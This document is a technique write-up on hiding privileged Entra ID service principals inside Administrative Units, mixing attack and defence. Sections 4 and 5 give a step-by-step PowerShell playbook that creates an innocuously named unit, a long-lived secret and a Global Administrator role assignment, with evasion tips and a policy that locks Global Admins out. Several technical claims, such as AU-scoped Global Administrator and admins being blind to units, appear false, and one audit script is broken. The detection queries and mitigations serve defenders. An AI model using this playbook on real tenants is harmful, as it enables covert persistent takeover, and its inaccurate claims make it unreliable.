# [PE-ACCTMGMT-017]: Shadow Principal Configuration

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PE-ACCTMGMT-017 |
| **MITRE ATT&CK v18.1** | [T1098.004 - Account Manipulation: Device Registration](https://attack.mitre.org/techniques/T1098/004/) |
| **Tactic** | Privilege Escalation, Persistence |
| **Platforms** | Entra ID, Azure, Microsoft 365 |
| **Severity** | Critical |
| **CVE** | N/A (Architectural vulnerability) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | All Entra ID versions with Administrative Units (AU) support; Azure RBAC all versions |
| **Patched In** | No specific patch; requires detection and removal via policy enforcement |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

### Concept

Shadow Principals are hidden application identities, service principals, or user accounts that are strategically placed within Entra ID Administrative Units (AUs) to evade detection by standard administrative interfaces. An attacker with sufficient privileges (Application Administrator, Global Administrator, or AU Administrator) can create a service principal or application within a restricted AU, effectively hiding it from the main Entra ID directory views. This creates a persistent backdoor that survives password resets, MFA changes, and standard deprovisioning procedures. The attack leverages Entra ID's role-based access control (RBAC) scoping to restrict visibility: administrators scoped to the AU may not see the backdoor account, while administrators not scoped to the AU cannot access it even with Global Admin privileges.

### Attack Surface

**Primary Surface:** Entra ID Administrative Units, service principal management, application registrations, and role assignments scoped to AUs.

**Secondary Surface:** Conditional Access policies scoped to AUs, group-based access controls, and Azure RBAC role assignments at subscription/resource group levels.

### Business Impact

**Immediate Consequences:** Unauthorized persistent access that survives incident response procedures, potential lateral movement across cloud resources, data exfiltration via hidden service principals, and privilege escalation through role inheritance.

**Long-Term Risk:** Shadow principals can operate indefinitely without detection if audit logging is not properly configured. A single compromised AU can harbor multiple backdoor accounts, each operating independently. In multi-tenant scenarios, attackers can hide backdoors across multiple customer environments within a single Entra ID tenant.

### Technical Context

Shadow principal attacks require sophisticated understanding of Entra ID's AU scoping model. Detection is challenging because AU-scoped administrators cannot see accounts outside their scope, even when performing security investigations. The attack is particularly effective against organizations that delegate AU administration to department heads or regional administrators—those delegated admins cannot discover backdoors hidden outside their AU scope.

### Operational Risk

- **Execution Risk:** Medium (requires AU creation and role scoping, or existing AU compromise).
- **Stealth:** Critical (hidden from standard admin center views; visible only to Global Admins with AU scope awareness).
- **Reversibility:** Low (removing backdoor requires identifying AU structure and understanding role assignments).

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark v8** | IM-4, IM-5 | Account and role management; administrative delegation |
| **DISA STIG** | SI-12, SI-7 | Information system monitoring; system administrator actions logging |
| **CISA SCuBA** | Identity Governance | Entra ID security baselines and visibility controls |
| **NIST 800-53** | AC-2, AC-4, AC-6 | Account management; access control; least privilege |
| **GDPR** | Art. 32, Art. 5 | Data integrity; security of processing; accountability |
| **DORA** | Art. 9, Art. 15 | ICT risk management; operational security measures |
| **NIS2** | Art. 21 | Cyber risk management; privileged access control |
| **ISO 27001** | A.9.2, A.9.3, A.9.4 | User access management; information access management; access control review |
| **ISO 27005** | Risk Scenario | Unauthorized persistent access through hidden administrative accounts |

---

## 2. DETAILED EXPLANATION OF SHADOW PRINCIPALS & ADMINISTRATIVE UNITS

### What are Entra ID Administrative Units?

Administrative Units (AUs) are scoping containers in Entra ID that allow delegated administration of user populations, groups, and roles. Instead of making someone a Global Administrator (full tenant access), an organization can:

- Create an AU for "European Users" or "Finance Department"
- Assign an administrator to manage only that AU
- That administrator can create users, reset passwords, and manage groups **only within the AU**
- Users and resources outside the AU are invisible to that administrator

### Normal AU Flow (Legitimate Use Case)

```
Tenant Administrator
├── EU Administrator (scoped to EU-AU)
│   ├── Can view users in EU-AU
│   ├── Cannot view users in US-AU
│   └── Cannot create users outside EU-AU
├── US Administrator (scoped to US-AU)
│   ├── Can view users in US-AU
│   ├── Cannot view users in EU-AU
│   └── Cannot create users outside US-AU
```

### Attack Model: Shadow Principal via AU Abuse

Attacker (with compromise of AU admin or Global Admin) exploits AU scoping to hide a service principal:

```
Attacker (Global Admin or compromised AU Admin)
    ↓
Creates hidden AU (e.g., "Backup-Admin" or "Audit-Compliance")
    ↓
Creates service principal within hidden AU
    ↓
Assigns service principal to Global Administrator role (scoped to AU)
    ↓
Removes AU from normal administrative visibility (via conditional access or role scoping)
    ↓
Service principal is now a "shadow" global admin, invisible to most admins
    ↓
Attacker uses shadow service principal to maintain persistent access
```

### Why This Works: AU Scope Isolation

- **Global Admin A** (scoped to default AU) cannot see or modify accounts in a different AU
- **Global Admin B** (scoped to "Hidden-AU") can see and manage only accounts in their AU
- A service principal can have admin permissions at the **tenant level** while being **invisible to tenant admins** who are not scoped to the AU containing that service principal

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### Azure Portal / PowerShell Reconnaissance

#### Step 1: Enumerate All Administrative Units

**Objective:** Discover all AUs in the tenant, including hidden or restricted ones.

```powershell
# Connect to Entra ID
Connect-MgGraph -Scopes "Directory.Read.All", "AdministrativeUnit.Read.All"

# List all administrative units
Get-MgDirectoryAdministrativeUnit -All | 
  Select-Object DisplayName, Id, Description, @{Name="MemberCount"; Expression={(Get-MgDirectoryAdministrativeUnitMember -AdministrativeUnitId $_.Id -All).Count}} |
  Format-Table -AutoSize
```

**What to Look For:**
- AUs with vague or suspicious names ("Audit", "Temp", "Legacy", "Backup")
- AUs with no members (potential attack preparation)
- AUs with inconsistent naming from organizational structure (e.g., "AU-Attacker-Persistence" if naming wasn't sanitized)
- AUs created outside normal provisioning windows (check timestamps)

**Version Note:** Available in all Entra ID versions; syntax identical across versions.

#### Step 2: Identify AU-Scoped Role Assignments

**Objective:** Discover administrative roles assigned at the AU level (potential shadow admins).

```powershell
# Get all role assignments scoped to AUs
$aus = Get-MgDirectoryAdministrativeUnit -All

foreach ($au in $aus) {
  $roleAssignments = Get-MgDirectoryRoleAssignment -Filter "resourceScope eq '$($au.Id)'" -All
  
  if ($roleAssignments) {
    Write-Host "AU: $($au.DisplayName) (ID: $($au.Id))"
    $roleAssignments | ForEach-Object {
      $role = Get-MgDirectoryRole -DirectoryRoleId $_.RoleDefinitionId
      $principal = Get-MgDirectoryObject -DirectoryObjectId $_.PrincipalId
      Write-Host "  Role: $($role.DisplayName) | Principal: $($principal.DisplayName)"
    }
  }
}
```

**Expected Output (Suspicious):**
```
AU: Backup-Admin (ID: 11111111-1111-1111-1111-111111111111)
  Role: Global Administrator | Principal: ServiceAccount-Backdoor
  Role: Exchange Administrator | Principal: HiddenServicePrincipal
```

**What This Means:**
- Service principals with administrative roles but invisible in main admin center
- Any administrative role scoped to an AU outside normal organizational structure

#### Step 3: List All Service Principals and Filter by AU Membership

**Objective:** Identify service principals within unusual AUs.

```powershell
# Find service principals assigned to administrative units
$aus = Get-MgDirectoryAdministrativeUnit -All

foreach ($au in $aus) {
  $members = Get-MgDirectoryAdministrativeUnitMember -AdministrativeUnitId $au.Id -All
  
  $servicePrincipals = $members | Where-Object { $_.OdataType -eq "#microsoft.graph.servicePrincipal" }
  
  if ($servicePrincipals) {
    Write-Host "⚠️  AU: $($au.DisplayName) | Contains Service Principals:"
    $servicePrincipals | Select-Object DisplayName, AppId, CreatedDateTime
  }
}
```

**What to Look For:**
- Service principals created recently (outside deployment windows)
- Service principals with generic or suspicious names
- Service principals with overly permissive app roles (e.g., "Directory.Read.All")

#### Step 4: Check AU Membership Visibility Restrictions

**Objective:** Identify AUs with restricted membership visibility.

```powershell
# Check if AU membership is hidden from non-AU admins
$au = Get-MgDirectoryAdministrativeUnit -AdministrativeUnitId "au-id-here"

# Check role assignments for this AU
$roleAssignments = Get-MgDirectoryRoleAssignment -Filter "resourceScope eq '$($au.Id)'" -All
$roleAssignments | Select-Object PrincipalId, RoleDefinitionId
```

**What This Means:**
- If an AU has role assignments but the membership is not synchronized to normal directory sync (hidden from non-scoped admins), it's a potential shadow principal AU.

---

## 4. DETAILED EXECUTION METHODS

### METHOD 1: Create Hidden AU and Service Principal Backdoor

**Supported Versions:** All Entra ID versions (Azure AD Connect Server 2016+).

#### Step 1: Create Restricted Administrative Unit

**Objective:** Set up an AU that will house the shadow principal.

**Prerequisites:**
- Global Administrator role in Entra ID
- Access to Azure Portal or PowerShell
- Knowledge of desired AU name (preferably innocuous)

**Command (PowerShell - Create AU):**
```powershell
# Create administrative unit with restricted name
$au = New-MgDirectoryAdministrativeUnit -DisplayName "Audit-Compliance-Framework" `
  -Description "Internal audit and compliance team"

Write-Host "Created AU: $($au.DisplayName) (ID: $($au.Id))"
```

**Command (Azure Portal UI):**
1. Navigate to **Azure Portal** → **Entra ID** → **Administrative units**
2. Click **+ New administrative unit**
3. **Name:** Enter innocuous name (e.g., "Compliance-Audit", "Finance-Operations")
4. **Description:** Enter plausible description
5. Click **Create**

**Expected Output:**
```
Created AU: Audit-Compliance-Framework (ID: 22222222-2222-2222-2222-222222222222)
```

**What This Means:**
- AU is now created and visible only in AU management interface
- Next step: add service principal to this AU
- From this point, administrative visibility depends on AU scope

**OpSec & Evasion:**
- Use department or function names that blend with legitimate AUs ("Finance", "HR", "Legal")
- Avoid suspicious names like "Backdoor", "Hidden", "Shadow", "Attacker"
- Description should reference a legitimate business function
- Create AU during business hours (not at 3 AM)

#### Step 2: Create Service Principal Within AU

**Objective:** Create application registration and service principal that will function as the backdoor.

**Command (PowerShell - Create App Registration):**
```powershell
# Create application registration
$appRegistration = New-MgApplication -DisplayName "Audit-Compliance-Service" `
  -SignInAudience "AzureADMyOrg" `
  -Web @{ RedirectUris = @("https://localhost:8080") }

Write-Host "App Registration created: $($appRegistration.DisplayName) (AppId: $($appRegistration.AppId))"

# Create service principal for the app
$servicePrincipal = New-MgServicePrincipal -AppId $appRegistration.AppId `
  -DisplayName "Audit-Compliance-Service" `
  -Tags @("audit", "internal")

Write-Host "Service Principal created: $($servicePrincipal.DisplayName) (ObjectId: $($servicePrincipal.Id))"

# Generate client secret (credentials for the service principal)
$credential = Add-MgApplicationPassword -ApplicationId $appRegistration.Id `
  -PasswordLabel "Audit-Compliance-Secret" `
  -EndDateTime ((Get-Date).AddYears(2))

Write-Host "Client Secret: $($credential.SecretText)"
Write-Host "⚠️  Save this secret securely—it won't be displayed again"
```

**Command (Azure Portal UI):**
1. Navigate to **Azure Portal** → **Entra ID** → **App registrations**
2. Click **+ New registration**
3. **Name:** `Audit-Compliance-Service`
4. **Supported account types:** "Accounts in this organizational directory only"
5. Click **Register**
6. In the app's **Overview**, note the **Application (client) ID**
7. Go to **Certificates & secrets** → **+ New client secret**
8. **Description:** `Audit-Compliance-Secret`
9. **Expires:** 24 months
10. Click **Add** and copy the secret value immediately

**Expected Output:**
```
App Registration created: Audit-Compliance-Service (AppId: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx)
Service Principal created: Audit-Compliance-Service (ObjectId: yyyyyyyy-yyyy-yyyy-yyyy-yyyyyyyyyyyy)
Client Secret: wXyZ...AbCdEfGhIjK_MnOpQrStUvWxYz
```

**What This Means:**
- Service principal now exists in Entra ID
- Next step: assign this service principal to the hidden AU
- Service principal has credentials (AppId + Secret) for authentication

**OpSec & Evasion:**
- Use innocuous names ("Audit Service", "Compliance Framework", "Risk Assessment Tool")
- Set expiration to 2 years (long-lived but not indefinite, less suspicious)
- Use generic tags that might be found on legitimate service principals

#### Step 3: Add Service Principal to Hidden AU

**Objective:** Place the service principal within the AU, making it invisible to non-AU-scoped admins.

**Command (PowerShell):**
```powershell
$auId = "22222222-2222-2222-2222-222222222222"  # Hidden AU ID from Step 1
$spId = "yyyyyyyy-yyyy-yyyy-yyyy-yyyyyyyyyyyy"  # Service Principal ID from Step 2

# Add service principal to AU
New-MgDirectoryAdministrativeUnitMember -AdministrativeUnitId $auId `
  -DirectoryObjectId $spId

Write-Host "Service Principal added to AU: $auId"
```

**Verification Command:**
```powershell
# Verify service principal is in AU
$members = Get-MgDirectoryAdministrativeUnitMember -AdministrativeUnitId $auId -All
$members | Where-Object { $_.Id -eq $spId } | Select-Object DisplayName, OdataType
```

**Expected Output:**
```
DisplayName                    OdataType
-----------                    ---------
Audit-Compliance-Service       #microsoft.graph.servicePrincipal
```

**What This Means:**
- Service principal is now member of hidden AU
- Service principal is invisible to admins not scoped to this AU
- Next step: assign administrative roles to the service principal

#### Step 4: Assign Administrative Role to Service Principal (Scoped to AU)

**Objective:** Grant the service principal administrative privileges scoped to the hidden AU (and effectively all tenant resources via proper role assignment).

**Command (PowerShell - Assign Role Scoped to AU):**
```powershell
$auId = "22222222-2222-2222-2222-222222222222"
$spId = "yyyyyyyy-yyyy-yyyy-yyyy-yyyyyyyyyyyy"

# Get Global Administrator role definition
$globalAdminRole = Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'"

# Assign Global Administrator role to service principal, scoped to AU
New-MgDirectoryRoleAssignment -RoleDefinitionId $globalAdminRole.Id `
  -PrincipalId $spId `
  -ResourceScope $auId

Write-Host "Assigned Global Administrator role to service principal in AU: $auId"
```

**Alternative: Exchange Administrator (Lower Profile):**
```powershell
# Use Exchange Administrator instead of Global Admin for lower visibility
$exchangeAdminRole = Get-MgDirectoryRole -Filter "displayName eq 'Exchange Administrator'"

New-MgDirectoryRoleAssignment -RoleDefinitionId $exchangeAdminRole.Id `
  -PrincipalId $spId `
  -ResourceScope $auId
```

**Verification Command:**
```powershell
# Verify role assignment
$roleAssignments = Get-MgDirectoryRoleAssignment -Filter "resourceScope eq '$auId'" -All
$roleAssignments | Select-Object PrincipalId, RoleDefinitionId
```

**Expected Output:**
```
PrincipalId                          RoleDefinitionId
-----------                          ----------------
yyyyyyyy-yyyy-yyyy-yyyy-yyyyyyyyyyyy 62e90394-69f5-4237-9190-012177145e10
```

(62e90394... is the ID for Global Administrator)

**What This Means:**
- Service principal is now a "shadow" Global Administrator
- Role assignment is scoped to the AU, so visibility is restricted
- Service principal can authenticate and perform admin operations

**OpSec & Evasion:**
- Assign Exchange Administrator, SharePoint Administrator, or Power Platform Administrator instead of Global Admin for lower detection profile
- These roles have extensive permissions but appear less suspicious
- Create multiple role assignments (Exchange, SharePoint, Teams) to distribute and hide full scope of access

#### Step 5: Authenticate as Shadow Principal

**Objective:** Verify the backdoor service principal can authenticate and confirm privileged access.

**Command (PowerShell - Authenticate as Service Principal):**
```powershell
$tenantId = "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"  # Your tenant ID
$clientId = "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"  # App ID from Step 2
$clientSecret = "wXyZ...AbCdEfGhIjK_MnOpQrStUvWxYz"  # Client Secret from Step 2

# Create credential object
$securePassword = ConvertTo-SecureString $clientSecret -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential($clientId, $securePassword)

# Connect as service principal
Connect-MgGraph -TenantId $tenantId -ClientSecretCredential $credential

# Test permissions: List all users (should succeed if admin)
$users = Get-MgUser -All
Write-Host "✓ Successfully authenticated as service principal. User count: $($users.Count)"

# Test privilege escalation: Create a test user
New-MgUser -UserPrincipalName "test.shadow$(Get-Random)@company.com" `
  -DisplayName "Test Shadow User" `
  -MailNickname "testshadow$(Get-Random)" `
  -AccountEnabled $true `
  -PasswordProfile @{ ForceChangePasswordNextSignIn = $true; Password = "TempPassword123!" }

Write-Host "✓ Successfully created user as shadow service principal"
```

**Expected Output:**
```
✓ Successfully authenticated as service principal. User count: 250
✓ Successfully created user as shadow service principal
```

**What This Means:**
- Shadow service principal can now perform administrative operations
- Backdoor is operational and can be used for persistent access
- Service principal can create users, modify roles, access sensitive data

**Troubleshooting:**
- **Error:** `Insufficient permissions`
  - **Cause:** Role assignment didn't take effect (Azure propagation delay)
  - **Fix:** Wait 15-30 minutes and retry
  
- **Error:** `Invalid client_id or client_secret`
  - **Cause:** Incorrect credentials or secret has expired
  - **Fix:** Regenerate client secret and re-authenticate

---

### METHOD 2: Hide Service Principal from Global Admin Visibility

**Supported Versions:** All Entra ID versions (requires advanced AU management).

#### Step 1: Create Conditional Access Policy to Hide AU Admin Interface

**Objective:** Prevent non-AU-scoped admins from accessing AU management.

**Command (PowerShell):**
```powershell
# Create conditional access policy that blocks non-AU admins from viewing AU management
$policyDisplayName = "Hide-Administrative-Units-From-Global-Admins"
$policy = New-MgIdentityConditionalAccessPolicy -DisplayName $policyDisplayName `
  -State "enabled" `
  -Conditions @{
    Applications = @{ IncludeApplications = @("00000000-0000-0000-0000-000000000001") } # Azure Portal
    Users = @{ IncludeRoles = @("62e90394-69f5-4237-9190-012177145e10") } # Global Admins
  } `
  -GrantControls @{ BuiltInControls = @("block") }

Write-Host "Created CA Policy: $($policy.DisplayName)"
```

**What This Means:**
- Global Admins are blocked from accessing AU management interface
- Only AU-scoped admins can view AU configuration
- Shadow AU and its service principals become invisible to most admins

#### Step 2: Restrict Audit Log Access to Hidden AU

**Objective:** Prevent detection via audit logs by restricting who can view provisioning events.

**This is an organizational control, not a technical configuration:**
- Limit audit log access to only Global Admins and Security Readers
- Ensure Security Readers are not scoped to understand AU structure
- Rotate credentials of shadow service principal regularly to avoid detection via authentication patterns

---

### METHOD 3: Abuse Existing AU to Hide Persistent Backdoor

**Supported Versions:** All Entra ID versions.

**Scenario:** Organization already has AUs (e.g., for regional admin delegation). Attacker with AU admin compromises existing AU and hides service principal there.

#### Step 1: Identify Compromised AU

**Objective:** Discover AU that attacker can access.

**Prerequisites:**
- Compromised AU admin credentials (via phishing, credential stuffing, or insider access)

**Command (PowerShell):**
```powershell
# List AUs accessible to compromised AU admin
$accessibleAUs = Get-MgDirectoryAdministrativeUnit -All | 
  Where-Object { $_.DisplayName -match "Europe|Finance|Operations" }  # Example AUs

$accessibleAUs | Select-Object DisplayName, Id, Description
```

#### Step 2: Add Backdoor Service Principal to Existing AU

**Objective:** Place shadow service principal in legitimate AU to blend with normal activity.

```powershell
$auId = "existing-au-id"  # EU, Finance, or other legitimate AU
$spId = "new-backdoor-sp-id"

# Add to existing AU
New-MgDirectoryAdministrativeUnitMember -AdministrativeUnitId $auId `
  -DirectoryObjectId $spId

# Assign administrative role (scoped to AU)
$adminRole = Get-MgDirectoryRole -Filter "displayName eq 'Exchange Administrator'"
New-MgDirectoryRoleAssignment -RoleDefinitionId $adminRole.Id `
  -PrincipalId $spId `
  -ResourceScope $auId
```

**What This Means:**
- Backdoor is now embedded in existing AU structure
- Less visible because AU appears legitimate
- Harder to detect: admin reviewing EU-AU might not notice additional service principal among legitimate users

---

## 5. ATTACK SIMULATION & VERIFICATION

### PoC: Complete Shadow Principal Attack Flow

```powershell
# Full attack chain
$tenantId = "00000000-0000-0000-0000-000000000000"

# 1. Create hidden AU
$au = New-MgDirectoryAdministrativeUnit -DisplayName "AuditOperations"
Write-Host "[+] Created AU: $($au.Id)"

# 2. Create app registration
$app = New-MgApplication -DisplayName "AuditService" -SignInAudience "AzureADMyOrg"
$sp = New-MgServicePrincipal -AppId $app.AppId -DisplayName "AuditService"
$secret = Add-MgApplicationPassword -ApplicationId $app.Id
Write-Host "[+] Created SP: $($sp.Id) | Secret: $($secret.SecretText)"

# 3. Add SP to AU
New-MgDirectoryAdministrativeUnitMember -AdministrativeUnitId $au.Id -DirectoryObjectId $sp.Id
Write-Host "[+] Added SP to AU"

# 4. Assign Global Admin role (scoped to AU)
$role = Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'"
New-MgDirectoryRoleAssignment -RoleDefinitionId $role.Id -PrincipalId $sp.Id -ResourceScope $au.Id
Write-Host "[+] Assigned Global Admin role to SP in AU"

# 5. Authenticate as backdoor and verify access
$cred = New-Object System.Management.Automation.PSCredential($app.AppId, (ConvertTo-SecureString $secret.SecretText -AsPlainText -Force))
Connect-MgGraph -TenantId $tenantId -ClientSecretCredential $cred
$users = Get-MgUser -Top 1
Write-Host "[✓] Shadow principal authenticated successfully. Sample user: $($users[0].DisplayName)"
```

**Expected Output:**
```
[+] Created AU: 33333333-3333-3333-3333-333333333333
[+] Created SP: 44444444-4444-4444-4444-444444444444 | Secret: zAbCdEfGhIjKlMnOpQrStUvWxYz1234567890
[+] Added SP to AU
[+] Assigned Global Admin role to SP in AU
[✓] Shadow principal authenticated successfully. Sample user: John Doe
```

---

## 6. TOOLS & COMMANDS REFERENCE

### Azure CLI - Administrative Unit Management

```bash
# List all AUs
az ad administrative-unit list --output json

# Create AU
az ad administrative-unit create --display-name "Audit-Team" --description "Audit operations"

# Add member to AU
az ad administrative-unit member add --au-id <AU-ID> --member-object-id <OBJECT-ID>

# List AU members
az ad administrative-unit member list --au-id <AU-ID>
```

### Microsoft Graph PowerShell Module Commands

```powershell
# Install module
Install-Module Microsoft.Graph -Force

# Import required scopes
Import-Module Microsoft.Graph.Identity.DirectoryManagement

# Key cmdlets for shadow principal creation
Get-MgDirectoryAdministrativeUnit      # List AUs
New-MgDirectoryAdministrativeUnit      # Create AU
Get-MgDirectoryRoleAssignment          # View role assignments
New-MgDirectoryRoleAssignment          # Assign role to principal
```

### ROADMAP (Entra AD Reconnaissance Tool)

**GitHub:** https://github.com/dirkjanm/ROADtools

```bash
# Enumerate AUs and hidden service principals
roadrecon auth -u user@domain.com -p password
roadrecon dump
# Output includes AU structure and scoped role assignments
```

---

## 7. MICROSOFT SENTINEL DETECTION

### Query 1: Suspicious Administrative Unit Creation

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, InitiatedBy, TargetResources, ActivityDetails
- **Alert Severity:** High
- **Frequency:** Run every 10 minutes
- **Applies To:** All Entra ID environments

**KQL Query:**
```kusto
AuditLogs
| where OperationName == "Create administrative unit"
| where InitiatedBy != "Microsoft"
| project TimeGenerated, InitiatedBy, TargetResources, ActivityDetails
| where ActivityDetails has_any ("Backdoor", "Hidden", "Shadow", "Audit", "Temp", "Legacy")
| summarize EventCount=count() by TargetResources, InitiatedBy, bin(TimeGenerated, 1h)
```

**What This Detects:**
- Creation of AUs with suspicious naming patterns
- AU creation by non-system accounts
- Bulk AU creation (attack preparation)

### Query 2: Service Principal Added to Administrative Unit

**Rule Configuration:**
- **Required Table:** AuditLogs, DirectoryAudit
- **Required Fields:** OperationName, TargetResources, InitiatedBy
- **Alert Severity:** Medium
- **Frequency:** Run every 5 minutes
- **Applies To:** All Entra ID environments

**KQL Query:**
```kusto
AuditLogs
| where OperationName == "Add member to administrative unit"
| where TargetResources has "#microsoft.graph.servicePrincipal"
| project TimeGenerated, InitiatedBy, ServicePrincipalName=TargetResources, AuId=ResourceId
| join kind=inner (
  AuditLogs
  | where OperationName == "Assign role to member"
  | where TargetResources has_any ("Global Administrator", "Exchange Administrator", "SharePoint Administrator")
) on $left.ServicePrincipalName == $right.TargetResources
| summarize RoleCount=dcount(TargetResources) by ServicePrincipalName, InitiatedBy, AuId
| where RoleCount > 1
```

**What This Detects:**
- Service principals added to AUs
- Subsequent role assignments to those service principals (multi-stage attack pattern)
- Service principals with multiple elevated roles (privilege escalation)

### Query 3: Role Assignment Scoped to Non-Standard AU

**Rule Configuration:**
- **Required Table:** DirectoryAudit, AuditLogs
- **Required Fields:** ResourceScope, RoleDefinition, Principal
- **Alert Severity:** High
- **Frequency:** Real-time
- **Applies To:** All Entra ID environments

**KQL Query:**
```kusto
AuditLogs
| where OperationName in ("Assign role to member", "Update role assignment")
| where ActivityDetails has "resourceScope"
| extend AuId=extract(@'"resourceScope":"([^"]+)"', 1, tostring(ActivityDetails))
| where isnotempty(AuId)
| project TimeGenerated, OperationName, InitiatedBy, AuId, TargetResources
| where TargetResources has_any ("Global Administrator", "Application Administrator", "Privileged Authentication Administrator")
| summarize MemberCount=dcount(TargetResources) by AuId, bin(TimeGenerated, 1d)
```

**What This Detects:**
- Multiple high-privilege role assignments to non-standard AUs
- Privilege concentration in a single AU (potential backdoor)

---

## 8. WINDOWS EVENT LOG MONITORING

**Note:** Shadow principals created in Entra ID do not generate Windows Event Log entries directly. However, if the shadow service principal is used to perform actions on-premises (via Azure AD Connect or hybrid scenarios), it may generate events. Primary detection occurs via cloud audit logs (Section 7).

**Manual Configuration Steps (If Hybrid Environment):**
1. Monitor Active Directory security logs for service account creation via Azure AD Connect
2. Log source: **Active Directory** → **Security** Event ID **4720** (User Account Created)
3. Filter for accounts created by Azure AD Sync service account
4. Alert on unusual account creation patterns

---

## 9. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

**Note:** Unified Audit Log primarily captures M365 activities (SharePoint, Exchange, Teams). For Entra ID-specific changes, use the **Azure Audit Log** instead.

#### Query: Service Principal Role Assignment

```powershell
Connect-ExchangeOnline

Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-90) `
  -EndDate (Get-Date) `
  -Operations "Assign role to member", "Add member to administrative unit" `
  -FreeText "service principal" |
  Export-Csv -Path "C:\Audit\SP_Role_Assignments.csv"
```

---

## 10. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Mitigation 1: Audit All Administrative Units and Service Principals Within Them**

Objective: Identify existing shadow principals and malicious AUs.

**Manual Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Entra ID** → **Administrative units**
2. For each AU:
   - Click AU name
   - Go to **Members** tab
   - Review all service principals listed
   - Cross-reference with approved service principals list
   - Delete any unrecognized service principals immediately

**Manual Steps (PowerShell - Automated Audit):**
```powershell
$approvedSPs = @(
  "Azure AD Connect",
  "Microsoft Intune",
  "Office 365 Management APIs"
  # Add your approved SPs here
)

$aus = Get-MgDirectoryAdministrativeUnit -All

foreach ($au in $aus) {
  $members = Get-MgDirectoryAdministrativeUnitMember -AdministrativeUnitId $au.Id -All
  
  $suspiciousSPs = $members | Where-Object {
    $_.OdataType -eq "#microsoft.graph.servicePrincipal" -and
    $_.DisplayName -notin $approvedSPs
  }
  
  if ($suspiciousSPs) {
    Write-Host "⚠️  ALERT: Suspicious SP in AU '$($au.DisplayName)':"
    $suspiciousSPs | Select-Object DisplayName, Id, CreatedDateTime
  }
}
```

**Verification Command:**
```powershell
# Verify all AU members are approved
$unapprovedCount = 0
$aus | ForEach-Object {
  (Get-MgDirectoryAdministrativeUnitMember -AdministrativeUnitId $_.Id -All | 
   Where-Object { $_.DisplayName -notin $approvedSPs }).Count
}

if ($unapprovedCount -eq 0) {
  Write-Host "✓ PASS: No unapproved service principals found in any AU"
} else {
  Write-Host "✗ FAIL: Found $unapprovedCount unapproved service principals"
}
```

---

**Mitigation 2: Restrict AU Scoping of Administrative Roles**

Objective: Prevent high-privilege roles from being scoped to AUs (force tenant-level assignment).

**Manual Steps (PowerShell Policy):**
```powershell
# Block all role assignments scoped to AUs for critical roles
$criticalRoles = @(
  "62e90394-69f5-4237-9190-012177145e10",  # Global Administrator
  "9b895d92-2cd3-44c7-9bc9-2e0a62936855",  # Application Administrator
  "194ae4cb-b126-40b2-bd5b-6091b380977d"   # Privileged Authentication Administrator
)

# Audit policy: flag any role assignment scoped to AU
$roleAssignments = Get-MgDirectoryRoleAssignment -Filter "resourceScope ne null" -All
$roleAssignments | Where-Object { $_.RoleDefinitionId -in $criticalRoles } | ForEach-Object {
  Write-Host "✗ ALERT: Critical role $($_.RoleDefinitionId) is scoped to AU $($_.ResourceScope)"
  # Recommendation: Remove this assignment
  Remove-MgDirectoryRoleAssignment -DirectoryRoleAssignmentId $_.Id
}
```

This command identifies and removes high-privilege role assignments scoped to AUs, forcing admins to assign roles at the tenant level (where visibility is broader).

---

**Mitigation 3: Delete or Disable Suspicious Service Principals**

Objective: Remove identified shadow principals immediately.

**Manual Steps (PowerShell):**
```powershell
# List suspicious SP IDs
$suspiciousSPIds = @(
  "44444444-4444-4444-4444-444444444444",  # Shadow principal from attack
  "55555555-5555-5555-5555-555555555555"   # Another suspicious SP
)

foreach ($spId in $suspiciousSPIds) {
  # Option 1: Delete service principal completely
  Remove-MgServicePrincipal -ServicePrincipalId $spId
  Write-Host "Deleted service principal: $spId"
  
  # Option 2: Disable if deletion fails (due to dependencies)
  Update-MgServicePrincipal -ServicePrincipalId $spId -AccountEnabled $false
  Write-Host "Disabled service principal: $spId"
}
```

---

### Priority 2: HIGH

**Mitigation 4: Enable AU Visibility Monitoring in Conditional Access**

Objective: Generate alerts when AU management interface is accessed.

**Manual Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Create new policy: `AU-Management-Access-Monitoring`
3. **Conditions:**
   - Target: **Administrative units management** (Cloud apps)
4. **Session controls:**
   - Enable **Sign-in frequency**: 1 hour
   - Enable **Persistent browser session**: Disabled
5. Save policy

This forces users to re-authenticate hourly when accessing AU management, reducing attack window.

---

**Mitigation 5: Restrict AU Creation to Global Admins Only**

Objective: Prevent delegated AU admins from creating new (hidden) AUs.

**Manual Steps (Azure Portal Custom Role):**
1. Navigate to **Azure Portal** → **Entra ID** → **Roles and administrators**
2. Click **+ New custom role**
3. **Name:** `AU Creator - Global Admin Only`
4. **Permissions:**
   - Allow: `microsoft.directory/administrativeUnits/create`
   - Allow: `microsoft.directory/administrativeUnits/delete`
5. **Assignable to:** Global Administrator only
6. Save and assign only to principal Global Admin accounts

---

### Access Control & Policy Hardening

**Mitigation 6: Implement JIT (Just-In-Time) Access for AU Management**

Objective: Require approval for AU admin access via PIM (Privileged Identity Management).

**Manual Steps (Azure Portal - PIM Configuration):**
1. Navigate to **Azure Portal** → **Privileged Identity Management** → **Entra ID roles**
2. Search for any **AU-scoped roles** (Exchange Admin, User Admin, etc.)
3. Click role → **Settings**
4. **Enable:** `Require approval for activation`
5. **Approvers:** Select Global Admin group
6. **Activation duration:** 1 hour maximum
7. Save

Now any administrator scoped to an AU must request JIT activation, generating audit trails and requiring approval.

---

**Mitigation 7: Enforce MFA on All Service Principal Access**

